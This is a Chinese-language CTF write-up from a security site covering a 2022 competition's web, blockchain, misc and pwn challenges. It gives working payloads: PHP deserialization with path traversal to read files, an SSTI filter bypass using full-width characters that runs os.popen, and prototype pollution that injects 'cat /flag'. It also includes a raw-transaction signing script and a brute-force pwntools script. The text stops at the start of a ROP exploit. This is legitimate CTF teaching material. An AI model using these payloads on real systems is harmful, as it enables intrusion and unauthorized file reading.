---
title: 强网拟态 WriteUp by Mini-Venom
url: https://www.secpulse.com/archives/190801.html
source: 安全脉搏
date: 2022-11-10
fetch_date: 2025-10-03T22:12:41.968025
---

# 强网拟态 WriteUp by Mini-Venom

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 强网拟态 WriteUp by Mini-Venom

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[ChaMd5安全团队](https://www.secpulse.com/newpage/author?author_id=3747)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-09

13,040

## Web

### ezus

解题思路 第一层 http://172.52.128.90/index.php/tm.php/%80?source 第二层 两个原题 https://blog.csdn.net/qq\_41918771/article/details/105754357 https://blog.csdn.net/mochu7777777/article/details/127216646

先传

```
username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&password=xxxx%22%3Bs%3A11%3A%22%00%2A%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A7%3A%22trypass%22%3Bs%3A4%3A%22hint%22%3Bs%3A60%3A%22mochu7%3A%2F%2Fprankhub%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fhint.php%22%3B%7D%7D
```

读到hint.php

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979029.png)

然后传

```
username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&password=xxxx%22%3Bs%3A11%3A%22%00%2A%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A7%3A%22trypass%22%3Bs%3A4%3A%22hint%22%3Bs%3A57%3A%22mochu7%3A%2F%2Fprankhub%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ff1111444449999.txt%22%3B%7D%7D
```

读到flag

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979031.png)

没有人比我更懂py

解题思路

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979033.png)

SSTI 但是限制了 a-zA-Z

iconv 转换后再 render，所以绕过思路应该就是在编码转换上

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979035.png)

用全角英文即可

```
ａｂｃｄｅｆｇｈｉｇｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ
```

```
words = {"a": "ａ","b": "ｂ","c": "ｃ","d": "ｄ","e": "ｅ","f": "ｆ","g": "ｇ","h": "ｈ","i": "ｉ","g": "ｇ","k": "ｋ","l": "ｌ","m": "ｍ","n": "ｎ","o": "ｏ","p": "ｐ","q": "ｑ","r": "ｒ","s": "ｓ","t": "ｔ","u": "ｕ","v": "ｖ","w": "ｗ","x": "ｘ","y": "ｙ","z": "ｚ"}
def convert(user_input):
  dst = user_input
  for w in words.keys():
    dst = dst.replace(w, words.get(w))
  return dst

convert("request.application.__globals__.__builtins__.__import__('os').popen('id').read()")
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979037.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979039.png)

flag{lfxWrTfILF5cdfxpUMvg9L7AbrQxC148}

### WHOYOUARE

解题思路

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979041.png)

先 checkUser 对执行的命令进行了检查，之后通过 merge 重新 merge 的时候触发原型链污染，覆盖 user.command

```
{"user":"{"__proto__":{"command":["-c","cat /flag"]},"command":["-c","-i"]}"}
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979043.png)

## Blockchain

### ToBeEquel

解题思路 题目禁用很多json rpc调用，只能用raw tx的方式与链上交互，需要用私钥签名交易后用geth的sendRawTransaction进行合约交互：

```
const Tx = require('ethereumjs-tx').Transaction
var privateKey = new Buffer('e8b923b1c045cb4c07c0c875a189fa168e7b5f0d848d82b5d9c6b1e346fc861c', 'hex')

var rawTx = {
  nonce: '0x00',
  gasPrice: '1000000000',
  gasLimit: '0x2710',
  to: '0x865ce4d250086ebb97bcd7eeda89207fa61b9211',
  value: '0x00',
  data: '0xa0f1d69c000000000000000000000000865ce4d250086ebb97bcd7eeda89207fa61b9211000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000155f43616c2875696e743235362c75696e7432353629000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000'
}

var tx = new Tx(rawTx)
tx.sign(privateKey)

var serializedTx = tx.serialize()
console.log(serializedTx.toString('hex'))
```

主要就是用CallTest函数调用\_Cal函数，映射过来就是data=>amount,msg.sender=>value，所以要生成后两位为特殊字符的账号，也就是找靓号。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979044.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979048.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979049.png)

## Misc

### welcome

解题思路 附件下来的txt文件，打开就有了emmm

### babymisc

解题思路 是一个猜数字小游戏，但是只给了十几次的机会，二分法也得碰运气，所以需要爆破，并且通过尝试，大概率区间是在100000-999999之间，然后就是碰运气了。 exp：

```
from pwn import *

context.log_level = 'debug'

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
rl      = lambda s                  :p.recvline(s)
it      = lambda                    :p.interactive()

for j in range(500):
    p = remote("", 9999)
    ru("> ")
    sl("Y")
    min = 100000
    max = 999999
    for i in range(15):
        mid = int((min + max) / 2)
        ru("Please enter a number:")
        sl(str(mid).encode())
        msg = ru("n")
        if "low" in msg:
            min = mid
        elif "up" in msg:
            max = mid
        else:
            pass
    print(j)
    p.close()
```

## Pwn

### bfbf

解题思路 可以修改i，然后可以任意读写了，如下所示

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190801-1667979052.png)

泄露地址之后改个ROP链即可

```
from pwn import*
global p
libc = ELF("./lib/libc.so.6")

...